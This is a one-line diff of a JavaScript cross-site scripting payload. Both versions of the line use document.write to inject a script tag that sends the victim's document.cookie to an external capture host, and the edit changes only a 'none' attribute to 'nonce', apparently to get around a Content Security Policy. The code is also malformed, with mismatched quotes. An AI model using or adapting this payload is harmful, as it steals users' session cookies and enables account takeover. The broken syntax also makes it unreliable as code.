@@ -1,2 +1,2 @@
-document.write('<script src="https://recept.free.beeceptor.com?='+document.cookie",none></script>);
+document.write('<script src="https://recept.free.beeceptor.com?='+document.cookie",nonce></script>);
 
